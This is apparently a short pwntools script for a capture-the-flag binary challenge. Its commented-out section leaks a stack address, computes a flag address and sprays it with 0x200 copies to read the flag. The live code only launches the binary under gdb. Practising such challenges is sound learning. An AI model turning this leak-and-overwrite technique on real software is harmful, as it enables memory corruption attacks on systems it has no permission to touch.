# from parse_args_and_some_func import *

# io = all_parsed_args['io']
# # io= all_parsed_args['io']
# io.sendafter("tell me your name\n", 0x10 * 'a')
# msg = io.recvline()
# leak_stack_addr = u64(msg[-7:-1] + b'\x00\x00' )
# LOG_ADDR('leak_stack_addr', leak_stack_addr)
# flag_addr = leak_stack_addr - 0x320
# msg = io.recvline()
# buf_low_addr = int(msg[5 : -1].decode(), base=16)
# LOG_ADDR('buf_low_addr', buf_low_addr)
# LOG_ADDR('flag_addr', flag_addr)
# STOP()
# io.sendafter("leave something?\n", str(0xffff))
# io.sendline(p64(flag_addr) * 0x200)
# io.interactive()

from pwn import *

io = process('./random')
context.terminal = ["open-wsl.exe", "-b", "-d ubuntu16", "-c"]
gdb.attach(io)

io.interactive()